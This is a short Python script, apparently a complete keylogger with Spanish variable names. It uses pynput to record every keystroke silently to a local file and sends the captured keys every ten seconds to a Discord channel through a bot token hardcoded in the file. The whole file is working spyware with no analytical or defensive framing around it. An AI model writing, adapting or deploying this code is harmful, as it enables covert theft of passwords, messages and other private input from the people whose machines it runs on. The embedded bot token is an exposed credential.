from pynput import keyboard
import logging
import discord
from discord.ext import commands
import asyncio

logging.disable(logging.CRITICAL)
carpeta_destino = 'C:\\keylogger.txt'
TOKEN = 'MTEyOTM4NTA1OTYxOTcwNDg4NA.GeLbSU.1XJk7vi0fea-bIKRG-dczV_DBwwxp7taS6X8Bo'
CANAL_ID = 1129385880931532806
INTERVALO = 10

logging.disable(logging.CRITICAL)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='/', intents=intents)

queue = asyncio.Queue()

@bot.event
async def on_ready():
    # print(f'Conectado como {bot.user}')
    while True:
        keys = []
        while not queue.empty():
            keys.append(await queue.get())
        if keys:
            canal = bot.get_channel(CANAL_ID)
            await canal.send(''.join(keys))
        await asyncio.sleep(INTERVALO)

def on_press(key):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    try:
        logging.log(10, str(key.char))
        queue.put_nowait(key.char)
    except AttributeError:
        logging.log(10, str(key))
        if key == keyboard.Key.space:
            queue.put_nowait(' ')
        else:
            queue.put_nowait(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    bot.run(TOKEN)
    listener.join()